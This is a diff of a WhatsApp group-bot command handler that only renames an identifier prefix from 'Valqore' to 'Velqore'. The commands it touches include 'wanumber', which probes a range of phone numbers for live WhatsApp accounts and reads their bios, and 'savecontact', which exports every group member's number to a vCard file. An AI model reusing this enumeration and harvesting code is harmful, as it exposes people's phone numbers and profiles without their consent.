 case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
-           	if (!text) return replygcValqore(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
+           	if (!text) return replygcVelqore(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
 var inputnumber = text.split(" ")[0]
         
-        replygcValqore(`Searching for WhatsApp account in given range...`)
+        replygcVelqore(`Searching for WhatsApp account in given range...`)
         function countInstances(string, word) {
             return string.split(word).length - 1
         }
@@ -2338,11 +2334,11 @@ var inputnumber = text.split(" ")[0]
             } else if (random_length == 4) {
                 random21 = `${status1}${status2}${status3}${dom4}`
             }
-            var anu = await ValqoreInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
+            var anu = await VelqoreInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
             var anuu = anu.length !== 0 ? anu : false
             try {
                 try {
-                    var anu1 = await ValqoreInc.fetchStatus(anu[0].jid)
+                    var anu1 = await VelqoreInc.fetchStatus(anu[0].jid)
                 } catch {
                     var anu1 = '401'
                 }
@@ -2355,23 +2351,23 @@ var inputnumber = text.split(" ")[0]
                 nowhatsapp += `${number0}${i}${number1}\n`
             }
         }
-        replygcValqore(`${text66}${nobio}${nowhatsapp}`)
+        replygcVelqore(`${text66}${nobio}${nowhatsapp}`)
         }
 break
 case 'getcontact': case 'getcon': {
-if (!m.isGroup) return ValqoreStickGroup()
-if (!(isGroupAdmins || ValqoreTheCreator)) return ValqoreStickAdmin()
-Valqorebigpp = await ValqoreInc.sendMessage(m.chat, {
+if (!m.isGroup) return VelqoreStickGroup()
+if (!(isGroupAdmins || VelqoreTheCreator)) return VelqoreStickAdmin()
+Velqorebigpp = await VelqoreInc.sendMessage(m.chat, {
     text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
 }, {quoted: m, ephemeralExpiration: 86400})
 await sleep(1000)
-ValqoreInc.sendContact(m.chat, participants.map(a => a.id), Valqorebigpp)
+VelqoreInc.sendContact(m.chat, participants.map(a => a.id), Velqorebigpp)
 }
 break
 case 'savecontact': case 'svcontact':{
-if (!m.isGroup) return ValqoreStickGroup()
-if (!(isGroupAdmins || ValqoreTheCreator)) return ValqoreStickAdmin()
-let cmiggc = await ValqoreInc.groupMetadata(m.chat)
+if (!m.isGroup) return VelqoreStickGroup()
+if (!(isGroupAdmins || VelqoreTheCreator)) return VelqoreStickAdmin()
+let cmiggc = await VelqoreInc.groupMetadata(m.chat)
 let orgiggc = participants.map(a => a.id)
 vcard = ''
 noPort = 0
@@ -2379,86 +2375,86 @@ for (let a of cmiggc.participants) {
     vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
 }
 let nmfilect = './contacts.vcf'
-replygcValqore('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
+replygcVelqore('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
 require('fs').writeFileSync(nmfilect, vcard.trim())
 await sleep(2000)
-ValqoreInc.sendMessage(m.chat, {
+VelqoreInc.sendMessage(m.chat, {
     document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
 }, {ephemeralExpiration: 86400, quoted: m})
 require('fs').unlinkSync(nmfilect)
 }
 break
 case 'sendcontact': case 'sencontact': {
-if (!m.isGroup) return ValqoreStickGroup()
-if (!m.mentionedJid[0]) return replygcValqore('\nUse like this\n Example:.sendcontact @tag|name')
+if (!m.isGroup) return VelqoreStickGroup()
+if (!m.mentionedJid[0]) return replygcVelqore('\nUse like this\n Example:.sendcontact @tag|name')
 let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
 let snContact = {
 	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
 }
-ValqoreInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
+VelqoreInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
 }
 break
 case 'contacttag': case 'contag':{
-if (!m.isGroup) return ValqoreStickGroup()
-if (!(isGroupAdmins || ValqoreTheCreator)) return ValqoreStickAdmin()
-if (!m.mentionedJid[0]) return replygcValqore('\nUse like this\n Example:.contacttag @tag|name')
+if (!m.isGroup) return VelqoreStickGroup()
+if (!(isGroupAdmins || VelqoreTheCreator)) return VelqoreStickAdmin()
+if (!m.mentionedJid[0]) return replygcVelqore('\nUse like this\n Example:.contacttag @tag|name')
 let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
 let sngContact = {
 	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
 }
-ValqoreInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
+VelqoreInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
 }
 break
             case 'add':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if(!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if(!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                await ValqoreInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
-                replygcValqore(mess.done)
+                await VelqoreInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
+                replygcVelqore(mess.done)
                 break
             case 'promote':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                await ValqoreInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
-                replygcValqore(mess.done)
+                await VelqoreInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
+                replygcVelqore(mess.done)
                 break
             case 'demote':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                await ValqoreInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
-                replygcValqore(mess.done)
+                await VelqoreInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
+                replygcVelqore(mess.done)
                 break
             case 'setnamegc':
             case 'setsubject':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                if (!text) return replygcValqore('Text ?')
-                await ValqoreInc.groupUpdateSubject(m.chat, text)
-                replygcValqore(mess.done)
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                if (!text) return replygcVelqore('Text ?')
+                await VelqoreInc.groupUpdateSubject(m.chat, text)
+                replygcVelqore(mess.done)
                 break
                 case 'userjid':{
-          	if(!ValqoreTheCreator) return ValqoreStickOwner()
-        const groupMetadata = m.isGroup ? await ValqoreInc.groupMetadata(m.chat).catch((e) => {}) : ""
+          	if(!VelqoreTheCreator) return VelqoreStickOwner()
+        const groupMetadata = m.isGroup ? await VelqoreInc.groupMetadata(m.chat).catch((e) => {}) : ""
 		const participants = m.isGroup ? await groupMetadata.participants : ""
     let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
     for (let mem of participants) {
             textt += `${themeemoji} ${mem.id}\n`
         }
-      replygcValqore(textt)
+      replygcVelqore(textt)
     }
     break
     case 'creategc': case 'creategroup': {
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (!args.join(" ")) return replygcValqore(`Use ${prefix+command} groupname`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (!args.join(" ")) return replygcVelqore(`Use ${prefix+command} groupname`)
 try {
-let cret = await ValqoreInc.groupCreate(args.join(" "), [])
-let response = await ValqoreInc.groupInviteCode(cret.id)
+let cret = await VelqoreInc.groupCreate(args.join(" "), [])
+let response = await VelqoreInc.groupInviteCode(cret.id)
 const teksop = `     「 Create Group 」
 
 ▸ Name : ${cret.subject}
@@ -2466,40 +2462,40 @@ const teksop = `     「 Create Group 」
 ▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
 
 https://chat.whatsapp.com/${response}`
-ValqoreInc.sendMessage(m.chat, { text:teksop, mentions: await ValqoreInc.parseMention(teksop)}, {quoted:m})
+VelqoreInc.sendMessage(m.chat, { text:teksop, mentions: await VelqoreInc.parseMention(teksop)}, {quoted:m})
 } catch {
-	replygcValqore(`Error`)
+	replygcVelqore(`Error`)
 	}
 }
 break
     case 'setbotbio':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (!text) return replygcValqore(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
-    await ValqoreInc.updateProfileStatus(text)
-    replygcValqore(`Success in changing the bio of bot's number`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (!text) return replygcVelqore(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
+    await VelqoreInc.updateProfileStatus(text)
+    replygcVelqore(`Success in changing the bio of bot's number`)
     }
     break
     case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
-if (!m.isGroup) return ValqoreStickGroup()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-    await ValqoreInc.removeProfilePicture(from)
+if (!m.isGroup) return VelqoreStickGroup()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+    await VelqoreInc.removeProfilePicture(from)
     }
     break
     case 'deleteppbot': case 'delppbot': {
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-    await ValqoreInc.removeProfilePicture(ValqoreInc.user.id)
-    replygcValqore(`Success in deleting bot's profile picture`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+    await VelqoreInc.removeProfilePicture(VelqoreInc.user.id)
+    replygcVelqore(`Success in deleting bot's profile picture`)
     }
     break
             case 'setdesc':
             case 'setdesk':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                if (!text) return replygcValqore('Text ?')
-                await ValqoreInc.groupUpdateDescription(m.chat, text)
-                replygcValqore(mess.done)
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                if (!text) return replygcVelqore('Text ?')
+                await VelqoreInc.groupUpdateDescription(m.chat, text)
+                replygcVelqore(mess.done)
                 break
             case 'setppgroup':
             case 'setppgrup':
@@ -2507,18 +2503,18 @@ if (!ValqoreTheCreator) return ValqoreStickOwner()
             case 'setgrouppp':
             case 'setgruppp':
             case 'setgcpp':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins) return replygcValqore(mess.admin)
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                if (!quoted) return replygcValqore(`Send/Reply Image With Caption ${prefix + command}`)
-                if (!/image/.test(mime)) return replygcValqore(`Send/Reply Image Caption Caption ${prefix + command}`)
-                if (/webp/.test(mime)) return replygcValqore(`Send/Reply Image With Caption ${prefix + command}`)
-                var medis = await ValqoreInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins) return replygcVelqore(mess.admin)
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                if (!quoted) return replygcVelqore(`Send/Reply Image With Caption ${prefix + command}`)
+                if (!/image/.test(mime)) return replygcVelqore(`Send/Reply Image Caption Caption ${prefix + command}`)
+                if (/webp/.test(mime)) return replygcVelqore(`Send/Reply Image With Caption ${prefix + command}`)
+                var medis = await VelqoreInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                 if (args[0] == 'full') {
                     var {
                         img
                     } = await generateProfilePicture(medis)
-                    await ValqoreInc.query({
+                    await VelqoreInc.query({
                         tag: 'iq',
                         attrs: {
                             to: m.chat,
@@ -2534,26 +2530,26 @@ if (!ValqoreTheCreator) return ValqoreStickOwner()
                         }]
                     })
                     fs.unlinkSync(medis)
-                    replygcValqore(mess.done)
+                    replygcVelqore(mess.done)
                 } else {
-                    var memeg = await ValqoreInc.updateProfilePicture(m.chat, {
+                    var memeg = await VelqoreInc.updateProfilePicture(m.chat, {
                         url: medis
                     })
                     fs.unlinkSync(medis)
-                    replygcValqore(mess.done)
+                    replygcVelqore(mess.done)
                 }
                 break
             case 'tagall':
             case 'tag':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 let me = m.sender
                 let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                 for (let mem of participants) {
                 teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                 }
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     text: teks,
                     mentions: participants.map(a => a.id)
                 }, {
@@ -2561,10 +2557,10 @@ if (!ValqoreTheCreator) return ValqoreStickOwner()
                 })
             break
             case 'hidetag':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                ValqoreInc.sendMessage(m.chat, {
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                VelqoreInc.sendMessage(m.chat, {
                     text: q ? q : '',
                     mentions: participants.map(a => a.id)
                 }, {
@@ -2572,38 +2568,38 @@ if (!ValqoreTheCreator) return ValqoreStickOwner()
                 })
             break
             case 'totag':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                if (!isAdmins) return replygcValqore(mess.admin)
-                if (!m.quoted) return replygcValqore(`Reply media with caption ${prefix + command}`)
-                ValqoreInc.sendMessage(m.chat, {
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                if (!isAdmins) return replygcVelqore(mess.admin)
+                if (!m.quoted) return replygcVelqore(`Reply media with caption ${prefix + command}`)
+                VelqoreInc.sendMessage(m.chat, {
                     forward: m.quoted.fakeObj,
                     mentions: participants.map(a => a.id)
                 })
             break
             case 'group':
             case 'grup':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 if (args[0] === 'close') {
-                    await ValqoreInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcValqore(`Success Closing Group`))
+                    await VelqoreInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcVelqore(`Success Closing Group`))
                 } else if (args[0] === 'open') {
-                    await ValqoreInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcValqore(`Success Opening Group`))
+                    await VelqoreInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcVelqore(`Success Opening Group`))
                 } else {
-                    replygcValqore(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
+                    replygcVelqore(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                 }
             break
             case 'editinfo':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 if (args[0] === 'open') {
-                    await ValqoreInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcValqore(`Successfully Opened Edit Group Info`))
+                    await VelqoreInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcVelqore(`Successfully Opened Edit Group Info`))
                 } else if (args[0] === 'close') {
-                    await ValqoreInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcValqore(`Successfully Closed Edit Group Info`))
+                    await VelqoreInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcVelqore(`Successfully Closed Edit Group Info`))
                 } else {
-                    replygcValqore(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
+                    replygcVelqore(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                 }
             break
             case 'linkgroup':
@@ -2612,11 +2608,11 @@ if (!ValqoreTheCreator) return ValqoreStickOwner()
             case 'gclink':
             case 'grouplink':
             case 'gruplink':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                let response = await ValqoreInc.groupInviteCode(m.chat)
-                ValqoreInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                let response = await VelqoreInc.groupInviteCode(m.chat)
+                VelqoreInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                     detectLink: true
                 })
             break
@@ -2625,26 +2621,26 @@ if (!ValqoreTheCreator) return ValqoreStickOwner()
     let who
     if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
     else who = m.quoted.sender ? m.quoted.sender : m.sender
-    let bio = await ValqoreInc.fetchStatus(who)
-    replygcValqore(bio.status)
+    let bio = await VelqoreInc.fetchStatus(who)
+    replygcVelqore(bio.status)
   } catch {
-    if (text) return replygcValqore(`bio is private or you haven't replied to the person's message!`)
+    if (text) return replygcVelqore(`bio is private or you haven't replied to the person's message!`)
     else try {
       let who = m.quoted ? m.quoted.sender : m.sender
-      let bio = await ValqoreInc.fetchStatus(who)
-      replygcValqore(bio.status)
+      let bio = await VelqoreInc.fetchStatus(who)
+      replygcVelqore(bio.status)
     } catch {
-      return replygcValqore(`bio is private or you haven't replied to the person's message!`)
+      return replygcVelqore(`bio is private or you haven't replied to the person's message!`)
     }
   }
 }
 break
         break
         case 'vote': {
-            if (!m.isGroup) return ValqoreStickGroup()
-            if (m.chat in vote) return replygcValqore(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
-            if (!text) return replygcValqore(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
-            replygcValqore(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
+            if (!m.isGroup) return VelqoreStickGroup()
+            if (m.chat in vote) return replygcVelqore(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
+            if (!text) return replygcVelqore(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
+            replygcVelqore(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
             vote[m.chat] = [q, [], []]
             await sleep(1000)
             upvote = vote[m.chat][1]
@@ -2671,15 +2667,15 @@ Please Type Below
 *${prefix}upvote* - to cast vote
 *${prefix}downvote* -  to downvote
 *${prefix}deletevote* - to delete vote`
-            ValqoreInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
+            VelqoreInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
 	    }
             break
                case 'upvote': {
-            if (!m.isGroup) return ValqoreStickGroup()
-            if (!(m.chat in vote)) return replygcValqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+            if (!m.isGroup) return VelqoreStickGroup()
+            if (!(m.chat in vote)) return replygcVelqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
             isVote = vote[m.chat][1].concat(vote[m.chat][2])
             wasVote = isVote.includes(m.sender)
-            if (wasVote) return replygcValqore('You have Voted')
+            if (wasVote) return replygcVelqore('You have Voted')
             vote[m.chat][1].push(m.sender)
             menvote = vote[m.chat][1].concat(vote[m.chat][2])
             teks_vote = `* VOTE *
@@ -2704,15 +2700,15 @@ Please Type Below
 *${prefix}upvote* - to upvote
 *${prefix}downvote* -  to downvote
 *${prefix}deletevote* - to delete vote`
-            ValqoreInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
+            VelqoreInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
 	    }
              break
                 case 'downvote': {
-            if (!m.isGroup) return ValqoreStickGroup()
-            if (!(m.chat in vote)) return replygcValqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+            if (!m.isGroup) return VelqoreStickGroup()
+            if (!(m.chat in vote)) return replygcVelqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
             isVote = vote[m.chat][1].concat(vote[m.chat][2])
             wasVote = isVote.includes(m.sender)
-            if (wasVote) return replygcValqore('You have Voted')
+            if (wasVote) return replygcVelqore('You have Voted')
             vote[m.chat][2].push(m.sender)
             menvote = vote[m.chat][1].concat(vote[m.chat][2])
             teks_vote = `* VOTE *
@@ -2737,13 +2733,13 @@ Please Type Below
 *${prefix}upvote* - to upvote
 *${prefix}downvote* -  to downvote
 *${prefix}deletevote* - to delete vote`
-            ValqoreInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
+            VelqoreInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
 	}
             break
                  
 case 'checkvote':
-if (!m.isGroup) return ValqoreStickGroup()
-if (!(m.chat in vote)) return replygcValqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+if (!m.isGroup) return VelqoreStickGroup()
+if (!(m.chat in vote)) return replygcVelqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
 teks_vote = `* VOTE *
 
 *Reason:* ${vote[m.chat][0]}
@@ -2765,26 +2761,26 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 *${prefix}deletevote* - to delete votes
 
 
-©${ValqoreInc.user.id}
+©${VelqoreInc.user.id}
 `
-ValqoreInc.sendTextWithMentions(m.chat, teks_vote, m)
+VelqoreInc.sendTextWithMentions(m.chat, teks_vote, m)
 break
 		case 'deletevote': case'delvote': case 'hapusvote': {
-            if (!m.isGroup) return ValqoreStickGroup()
-            if (!(m.chat in vote)) return replygcValqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+            if (!m.isGroup) return VelqoreStickGroup()
+            if (!(m.chat in vote)) return replygcVelqore(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
             delete vote[m.chat]
-            replygcValqore('Successfully Deleted Vote Session In This Group')
+            replygcVelqore('Successfully Deleted Vote Session In This Group')
 	    }
             break
 break
             case 'revoke':
             case 'resetlink':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                await ValqoreInc.groupRevokeInvite(m.chat)
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                await VelqoreInc.groupRevokeInvite(m.chat)
                     .then(res => {
-                        replygcValqore(`Reset Success`)
+                        replygcVelqore(`Reset Success`)
                     })
             break
                 //bot status
@@ -2832,7 +2828,7 @@ ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type =>
 _CPU Core(s) Usage (${cpus.length} Core CPU)_
 ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                 `.trim()
-	ValqoreInc.relayMessage(m.chat,  {
+	VelqoreInc.relayMessage(m.chat,  {
         requestPaymentMessage: {
           currencyCodeIso4217: 'INR',
           amount1000: 999999999,
@@ -2862,7 +2858,7 @@ ${themeemoji} Forks: ${repoData.forks_count}
 ${themeemoji} URL: ${repoData.html_url}
      
  `.trim()
-      await ValqoreInc.relayMessage(m.chat,  {
+      await VelqoreInc.relayMessage(m.chat,  {
         requestPaymentMessage: {
           currencyCodeIso4217: 'INR',
           amount1000: 69000,
@@ -2875,18 +2871,18 @@ ${themeemoji} URL: ${repoData.html_url}
           showAdAttribution: true
           }}}}}}, {})
     } else {
-      await replygcValqore(`Unable to fetch repository information`)
+      await replygcVelqore(`Unable to fetch repository information`)
     }
   } catch (error) {
     console.error(error)
-    await replygcValqore(`Repository currently not available `)
+    await replygcVelqore(`Repository currently not available `)
   }
 }
 break
             case 'buypremium':
             case 'premiumuser': {
                 let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`
-                await ValqoreInc.sendMessage(m.chat, {
+                await VelqoreInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
                         externalAdReply: {
@@ -2905,10 +2901,10 @@ break
             }
             break
             case 'rentbot':
-                replygcValqore(`Type ${prefix}owner and chat him`)
+                replygcVelqore(`Type ${prefix}owner and chat him`)
                 break
             case 'speedtest': {
-                replygcValqore('Testing Speed...')
+                replygcVelqore('Testing Speed...')
                 let cp = require('child_process')
                 let {
                     promisify
@@ -2924,7 +2920,7 @@ break
                         stdout,
                         stderr
                     } = o
-                    if (stdout.trim()) ValqoreInc.sendMessage(m.chat, {
+                    if (stdout.trim()) VelqoreInc.sendMessage(m.chat, {
                         text: stdout,
                         contextInfo: {
                             externalAdReply: {
@@ -2940,7 +2936,7 @@ break
                     }, {
                         quoted: m
                     })
-                    if (stderr.trim()) ValqoreInc.sendMessage(m.chat, {
+                    if (stderr.trim()) VelqoreInc.sendMessage(m.chat, {
                         text: stderr,
                         contextInfo: {
                             externalAdReply: {
@@ -2961,7 +2957,7 @@ break
             break
             case 'runtime':
                 let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
